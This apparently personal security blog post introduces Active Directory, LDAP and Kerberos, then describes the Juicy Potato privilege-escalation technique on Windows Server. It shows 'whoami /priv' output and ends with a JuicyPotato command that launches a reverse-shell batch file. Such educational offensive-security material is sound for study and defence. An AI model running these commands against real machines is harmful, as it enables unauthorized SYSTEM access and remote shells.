---
layout: post
title: "Windows Exploitation"
author: "joelczk"
tags: Vulns
excerpt_separator: <!--more-->
---

Disclaimer: All exploits stated in this article are only for educational purposes and all the views expressed in this article are my own personal views and should not be associated with any other organizations/parties that I currently/used to represent.
<!--more-->

## Introduction to Active Directory
To start off, let me introduction all of you to a new term ```Active Directory```. Active directory is the directory service that was developed by Microsoft for a huge range of directory-based identity-related services, and is included in most of Windows Server operating systems.

A server that is running the Active Directory Domain Service is called the domain controller and its main role is to authenticate and authorize users who are accessing any service. It is also responsible for enforcing and assigning security policies for all the computers in the network. 

Lightweight Directory Access Protocol (LDAP) is an internet protocol that is used to access and maintain distributed directory information services over an Internat Protocol network.

Kerberos is a computer-network authentication protocol that uses tickets to allow nodes to communicate over an insecure network to prove their identity to one another in a secure manner.

Currently, Microsoft's Active Directory uses LDAP, Kerberos and DNS. 

## Kernel exploits
Let us now move into the more common kernel exploits that can be exploited on the Active Directory.

### Juicy Potato Exploit
This exploit leverages on the **SeImpersonatePrivilege** or **SeAssignPrimaryToken** that is enabled on the machine to elevate the local privileges to system privileges. Typically, such privileges would be enabled by default if the machine is running IIS or SQL services.

```
PS C:\> whoami /priv
 
PRIVILEGES INFORMATION
----------------------
 
Privilege Name                Description                               State  
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

However, one thing to note is that the Juicy Potato exploit does not work for all Windows version. It only works for specified Windows version:
- Windows Server 2008 R2
- Windows Server 2012
- Windows Server 2012 R2
- Windows Server 2016

Apart from that, we also require that the COM server has a unique CLSID for the exploit to work. 
*Note: COM server is an executable that implements a set of COM objects and CLSID is the globally unique identifier that identifies a COM object*

In such a case, we can use Juicy Potato exploit with the following command.
- p parameter : Program to launch. In this case, we have a shell.bat that will create a reverse shell payload
- l parameter : Port where the COM server is listening to. In this case, the port will be the port of the listener of our reverse shell.
```
.\JuicyPotato.exe -t * -p shell.bat -l <port>
```